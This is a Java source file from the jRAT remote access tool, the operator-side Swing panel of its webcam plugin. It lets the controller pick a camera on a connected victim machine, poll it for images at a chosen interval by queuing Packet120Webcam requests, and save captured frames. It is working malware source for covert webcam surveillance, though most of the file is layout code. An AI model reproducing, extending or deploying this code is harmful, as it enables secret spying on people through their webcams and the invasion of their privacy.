package se.jrat.plugin.webcam.client;

import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.List;

import javax.imageio.ImageIO;
import javax.swing.ButtonGroup;
import javax.swing.DefaultComboBoxModel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JScrollPane;
import javax.swing.JSeparator;
import javax.swing.JSpinner;
import javax.swing.JToggleButton;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.SpinnerNumberModel;
import javax.swing.SwingConstants;

import jrat.api.BaseControlPanel;

@SuppressWarnings("serial")
public class PanelWebcam extends BaseControlPanel {
	
	public static int WIDTH = 320;
	public static int HEIGHT = 240;
	
	private final ButtonGroup buttonGroup = new ButtonGroup();
	
	public BufferedImage image;
	public ImageIcon icon;
	public JLabel lbl;
	public JScrollPane scrollPane;
	private JToggleButton tglbtnEnable;
	private JToggleButton tglbtnDisable;
	private JSpinner spInterval;
	private JComboBox<String> comboBox;
	private JLabel lblName;

	public void setDisabled() {
		
	}
	
	public void setNoWebcamFound() {
		tglbtnDisable.setSelected(true);
		tglbtnEnable.setSelected(false);
		setCamName("No webcam found");
		lblName.setForeground(Color.red);
	}
	
	public PanelWebcam() {
		image = new BufferedImage(WIDTH, HEIGHT, BufferedImage.TYPE_INT_RGB);
		icon = new ImageIcon(image);
		lbl = new JLabel(icon);
		scrollPane = new JScrollPane(lbl);
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
		
		tglbtnEnable = new JToggleButton("Enable");
		tglbtnEnable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				try {
					WebcamPlugin.enabled = true;						
					new Thread(new Runnable() {
						@Override
						public void run() {
							try {
								while (true) {
									getServer().addToSendQueue(new Packet120Webcam(getServer(), comboBox.getSelectedIndex()));
									
									if (!WebcamPlugin.enabled) {
										return;
									}
									
									Thread.sleep((long) (Integer) spInterval.getValue());
								}
							} catch (Exception e) {
								e.printStackTrace();
							}
						}			
					}).start();
				} catch (Exception e) {					
					e.printStackTrace();
				}
			}
		});
		buttonGroup.add(tglbtnEnable);
		
		tglbtnDisable = new JToggleButton("Disable");
		tglbtnDisable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				disableCapturing();			
			}
		});
		buttonGroup.add(tglbtnDisable);
		tglbtnDisable.setSelected(true);
		
		JButton btnSave = new JButton("Save");
		btnSave.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JFileChooser c = new JFileChooser();
				c.showSaveDialog(null);
				File file = c.getSelectedFile();
				
				if (file != null) {
					try {
						ImageIO.write(image, "png", file);
					} catch (Exception e) {				
						e.printStackTrace();
					}
				}
			}
		});
		
		JSeparator separator = new JSeparator();
		separator.setOrientation(SwingConstants.VERTICAL);
		
		JSeparator separator_1 = new JSeparator();
		separator_1.setOrientation(SwingConstants.VERTICAL);
		
		spInterval = new JSpinner();
		spInterval.setModel(new SpinnerNumberModel(100, 0, 10000, 10));
		
		JLabel lblMs = new JLabel("ms");
		
		DefaultComboBoxModel<String> model = new DefaultComboBoxModel<String>();
		comboBox = new JComboBox<String>(model);
		
		List<String> cams = WebcamPlugin.map.get(getServer());
		
		for (String s : cams) {
			model.addElement(s);
		}

		lblName = new JLabel("...");
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addComponent(scrollPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 450, Short.MAX_VALUE)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addGroup(groupLayout.createSequentialGroup()
							.addComponent(tglbtnEnable)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(tglbtnDisable)
							.addGap(8)
							.addComponent(separator, GroupLayout.PREFERRED_SIZE, 3, GroupLayout.PREFERRED_SIZE)
							.addGap(7)
							.addComponent(btnSave)
							.addPreferredGap(ComponentPlacement.UNRELATED)
							.addComponent(separator_1, GroupLayout.PREFERRED_SIZE, 3, GroupLayout.PREFERRED_SIZE)
							.addPreferredGap(ComponentPlacement.UNRELATED)
							.addComponent(spInterval, GroupLayout.PREFERRED_SIZE, 60, GroupLayout.PREFERRED_SIZE)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(lblMs))
						.addGroup(groupLayout.createSequentialGroup()
							.addComponent(comboBox, GroupLayout.PREFERRED_SIZE, 250, GroupLayout.PREFERRED_SIZE)
							.addPreferredGap(ComponentPlacement.UNRELATED)
							.addComponent(lblName)))
					.addContainerGap(127, Short.MAX_VALUE))
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
							.addComponent(tglbtnEnable)
							.addComponent(tglbtnDisable)
							.addComponent(btnSave))
						.addComponent(separator, GroupLayout.PREFERRED_SIZE, 22, GroupLayout.PREFERRED_SIZE)
						.addComponent(separator_1, GroupLayout.PREFERRED_SIZE, 22, GroupLayout.PREFERRED_SIZE)
						.addGroup(groupLayout.createSequentialGroup()
							.addGap(2)
							.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
								.addComponent(spInterval, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
								.addComponent(lblMs))))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
						.addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
						.addComponent(lblName))
					.addGap(14))
		);
		setLayout(groupLayout);

	}
	
	@Override
	public void onClose() {
		disableCapturing();
	}
	
	public void disableCapturing() {
		try {
			WebcamPlugin.enabled = false;
			Thread.sleep((long) (Integer) spInterval.getValue());
			getServer().addToSendQueue(new Packet120Webcam(getServer(), comboBox.getSelectedIndex()));
		} catch (Exception e) {					
			e.printStackTrace();
		}	
	}

	public void setCamName(String name) {
		lblName.setText(name);
	}
}
